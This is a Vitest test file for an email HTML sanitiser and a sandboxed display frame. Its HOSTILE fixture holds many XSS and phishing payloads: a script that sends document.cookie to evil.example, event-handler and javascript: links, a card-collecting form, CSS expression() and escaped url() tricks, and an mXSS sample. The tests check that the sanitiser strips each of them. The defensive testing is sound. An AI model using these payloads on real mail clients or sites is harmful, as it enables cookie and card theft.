// @vitest-environment jsdom
// SPDX-License-Identifier: AGPL-3.0-only
// The two walls around a mail's HTML body. First wall, the sanitiser: nothing that runs, nothing that
// loads, nothing that submits or navigates survives, while the message keeps its own look. Second
// wall, the frame: no script, no same-origin together with script, no top navigation, a policy that
// fetches nothing.
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';

import {
  BLOCKED_CLASS,
  CID_ATTRIBUTE,
  blockedTotal,
  cleanStyleAttribute,
  cleanStyleSheet,
  prepareMailHtml,
} from '../../../src/fantay/artifact/viewers/email/sanitize-mail';
import { MailFrame } from '../../../src/fantay/artifact/viewers/email/MailFrame';
import { SANDBOX_FRAME_CSP, SandboxFrame, sandboxFrameDocument } from '../../../src/fantay/artifact/viewers/parts/SandboxFrame';

function markup(html: string, parts: string[] = []) {
  const prepared = prepareMailHtml(html, (cid) => parts.includes(cid));
  const host = document.createElement('div');
  host.append(prepared.fragment.cloneNode(true));
  return { ...prepared, html: host.innerHTML, host };
}

const HOSTILE = `<html><head>
<meta http-equiv="refresh" content="0;url=https://evil.example/land">
<base href="https://evil.example/">
<link rel="stylesheet" href="https://evil.example/steal.css">
<style>@import 'https://evil.example/a.css'; p { color: #1a1a1a; } .x { background: url(https://evil.example/bg.png); width: expression(alert(1)); } .y { behavior: url(evil.htc); -moz-binding: url(evil.xml#x); }</style>
<script>fetch('https://evil.example/?c=' + document.cookie)</script>
</head>
<body onload="alert('body')">
<p>请<b>立即</b>验证</p>
<p><img src="x" onerror="alert('img')"> <img src="https://evil.example/track.gif" width="1" height="1"></p>
<p><a href="javascript:alert('link')">a</a> <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">b</a> <a href="https://bank.example/login" onclick="alert('click')" target="_top">c</a> <a href="vbscript:msgbox(1)">d</a> <a href=" JaVaScRiPt:alert(1)">e</a></p>
<form action="https://evil.example/collect" method="post"><input name="card"><button type="submit" formaction="https://evil.example/x">提交</button></form>
<iframe src="https://evil.example/frame"></iframe><object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">
<svg><script>alert('svg')</script><a xlink:href="javascript:alert(2)"><rect width="10" height="10"/></a><image href="https://evil.example/s.png"/></svg>
<p class="x" style="background-image:url('https://evil.example/s.png'); color: #a11; width: expression(alert(3)); behavior: url(x.htc)">安全中心</p>
<p style="background:u\\72l(https://evil.example/escaped.png)">escaped</p>
<math><mtext><table><mglyph><style><img src=x onerror=alert('mxss')></style></mglyph></table></mtext></math>
<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"></video>
<img srcset="https://evil.example/a.png 2x" alt="srcset">
<table background="https://evil.example/bg.gif"><tr><td background="https://evil.example/td.gif">cell</td></tr></table>
</body></html>`;

describe('prepareMailHtml: what must not survive', () => {
  const out = markup(HOSTILE);
  const all = [out.html, out.css].join('\n');

  it('removes scripts, event handlers and script-bearing SVG', () => {
    expect(out.host.querySelector('script, svg, math')).toBeNull();
    expect(all).not.toMatch(/<script|alert\(|onerror|onload|onclick/i);
  });

  it('removes javascript:, vbscript: and data:text/html links but keeps the words', () => {
    const hrefs = Array.from(out.host.querySelectorAll('a')).map((anchor) => anchor.getAttribute('href'));
    expect(hrefs).toEqual([null, null, 'https://bank.example/login', null, null]);
    expect(out.host.textContent).toContain('a b c d e');
    expect(out.host.querySelector('[target]')).toBeNull();
  });

  it('removes meta refresh, base, link, object, embed, iframe, video and forms', () => {
    expect(out.host.querySelector('meta, base, link, object, embed, iframe, frame, video, audio, form, input, button, textarea, select')).toBeNull();
    expect(all).not.toMatch(/refresh|formaction|action=/i);
  });

  it('removes every remote address: CSS url(), @import, expression(), behavior, background, srcset', () => {
    expect(all).not.toMatch(/evil\.example/);
    expect(all).not.toMatch(/url\s*\(|@import|expression|behavior|binding/i);
    expect(out.host.querySelector('[background], [srcset], [poster]')).toBeNull();
  });

  it('keeps the harmless part of a style', () => {
    expect(out.css).toContain('p {color: #1a1a1a; }');
    expect(out.css).toContain('.x { }');
    expect(out.host.querySelector('p.x')?.getAttribute('style')).toBe('color: #a11');
  });

  it('counts what was blocked', () => {
    expect(out.blocked).toMatchObject({ scripts: 2, forms: 1, styles: 2, trackers: 1 });
    expect(out.blocked.embeds).toBe(4);
    // background attributes (2), the url() in .x and in two style attributes.
    expect(out.blocked.images).toBeGreaterThanOrEqual(5);
    expect(blockedTotal(out.blocked)).toBeGreaterThan(10);
  });
});

describe('prepareMailHtml: what the message keeps', () => {
  it('keeps table layout, presentational attributes, classes and inline colours', () => {
    const out = markup(
      '<table width="600" cellpadding="0" cellspacing="0" bgcolor="#ffffff" class="wrap"><tr><td align="center" valign="top" style="padding:20px;color:#12161f;font:15px/1.6 sans-serif">Hi</td></tr></table>',
    );
    const table = out.host.querySelector('table');
    expect(table?.getAttribute('width')).toBe('600');
    expect(table?.getAttribute('bgcolor')).toBe('#ffffff');
    expect(table?.getAttribute('class')).toBe('wrap');
    expect(out.host.querySelector('td')?.getAttribute('valign')).toBe('top');
    expect(out.host.querySelector('td')?.getAttribute('style')).toContain('color:#12161f');
  });

  it('resolves cid: pictures from the message and leaves unknown ones as their words', () => {
    const out = markup('<p><img src="cid:Logo%40News" alt="logo"><img src="cid:missing@x" alt="缺少的图"><img src="cid:gone@x"></p>', ['logo@news']);
    const images = out.host.querySelectorAll('img');
    expect(images).toHaveLength(1);
    expect(images[0]?.getAttribute(CID_ATTRIBUTE)).toBe('logo@news');
    expect(images[0]?.hasAttribute('src')).toBe(false);
    expect(out.cids).toEqual(new Set(['logo@news']));
    expect(out.host.querySelector(`.${BLOCKED_CLASS}`)?.textContent).toBe('缺少的图');
  });

  it('turns a remote picture into a sized box with its words, and drops tracking pixels', () => {
    const out = markup(
      '<img src="https://img.example/hero.jpg" width="536" height="240" alt="看板截图" style="display:block"><img src="//t.example/o.gif" width="1" height="1"><img src="https://t.example/p.gif" style="display:none">',
    );
    const box = out.host.querySelector(`.${BLOCKED_CLASS}`);
    expect(box?.textContent).toBe('看板截图');
    expect(box?.getAttribute('style')).toContain('width:min(536px,100%)');
    expect(box?.getAttribute('style')).toContain('aspect-ratio:536/240');
    expect(box?.getAttribute('style')).toContain('display:flex');
    expect(out.host.querySelectorAll('img')).toHaveLength(0);
    expect(out.blocked).toMatchObject({ images: 1, trackers: 2 });
  });

  it('lets nothing pin itself over the message', () => {
    expect(cleanStyleAttribute('position:fixed;top:0;left:0;background:white')).toBe('top:0;left:0;background:white');
    expect(cleanStyleAttribute('position: sticky;color:red')).toBe('color:red');
    expect(cleanStyleAttribute('position:relative')).toBe('position:relative');
  });

  it('keeps embedded bitmaps', () => {
    const pixel = 'data:image/png;base64,iVBORw0KGgo=';
    expect(markup(`<img src="${pixel}" alt="">`).host.querySelector('img')?.getAttribute('src')).toBe(pixel);
    expect(markup('<img src="data:image/svg+xml;base64,PHN2Zz4=">').host.querySelector('img')).toBeNull();
  });

  it('carries the body\'s own background and colour to the frame', () => {
    const out = markup('<body bgcolor="#f2f3f5" text="#222" style="margin:0;background-image:url(https://x.example/b.png)"><p>x</p></body>');
    expect(out.bodyStyle).toBe('background-color:#f2f3f5;color:#222;margin:0');
  });

  it('says when nothing is left to see', () => {
    expect(markup('<script>alert(1)</script><style>p{}</style>').visible).toBe(false);
    expect(markup('<p>Hello</p>').visible).toBe(true);
  });
});

describe('mail CSS', () => {
  it('drops declarations with addresses, however they are spelled', () => {
    expect(cleanStyleAttribute('color:red;background:URL(https://x.example/a)')).toBe('color:red');
    expect(cleanStyleAttribute('background:u\\72l(https://x.example/a);margin:0')).toBe('margin:0');
    expect(cleanStyleAttribute('background:ur/**/l(https://x.example/a)')).toBe('background:ur l(https://x.example/a)');
    expect(cleanStyleAttribute('background-image:image-set("a.png" 1x)')).toBe('');
    expect(cleanStyleAttribute('width:expression(alert(1))')).toBe('');
    expect(cleanStyleAttribute('-moz-binding:x;behavior:y;color:blue')).toBe('color:blue');
  });

  it('keeps rules and media queries, removes @import and @font-face', () => {
    const blocked = { images: 0, trackers: 0, styles: 0, fonts: 0, embeds: 0, forms: 0, scripts: 0 };
    const css = cleanStyleSheet(
      '@import url(https://f.example/a.css);\n@font-face{font-family:B;src:url(https://f.example/b.woff2)}\n.a{color:#111;background:url(https://i.example/x.png)}\n@media (max-width: 600px){.a{width:100% !important}}',
      blocked,
    );
    expect(css).not.toMatch(/@import|font-face|url\(/);
    expect(css).toContain('.a{color:#111;}');
    expect(css).toContain('@media (max-width: 600px){.a{width:100% !important}}');
    expect(blocked).toMatchObject({ styles: 1, fonts: 1, images: 1 });
  });

  it('turns viewport heights into pixels so a growing frame cannot grow with them', () => {
    expect(cleanStyleAttribute('min-height:100vh;width:50vw')).toBe('min-height:800px;width:50vw');
  });
});

describe('the frame', () => {
  it('runs no script and cannot navigate the app', () => {
    const html = renderToStaticMarkup(<SandboxFrame title="m.eml" css="" onReady={() => undefined} />);
    const sandbox = /sandbox="([^"]*)"/.exec(html)?.[1];
    expect(sandbox).toBe('allow-same-origin');
    expect(sandbox).not.toMatch(/allow-scripts|allow-top-navigation|allow-popups|allow-forms|allow-modals/);
  });

  it('is the frame the mail body is drawn in', () => {
    const html = renderToStaticMarkup(
      <MailFrame title="m.eml" prepared={markup('<p>x</p>')} attachments={[]} onLink={() => true} onHover={() => undefined} onFitted={() => undefined} />,
    );
    expect(/sandbox="([^"]*)"/.exec(html)?.[1]).toBe('allow-same-origin');
    expect(html).not.toContain('allow-scripts');
  });

  it('fetches nothing: the policy allows only inline style and in-memory pictures', () => {
    expect(SANDBOX_FRAME_CSP).toContain("default-src 'none'");
    expect(SANDBOX_FRAME_CSP).toContain("form-action 'none'");
    expect(SANDBOX_FRAME_CSP).not.toMatch(/script-src|https?:/);
    expect(sandboxFrameDocument('')).toContain('<base target="_blank">');
  });
});
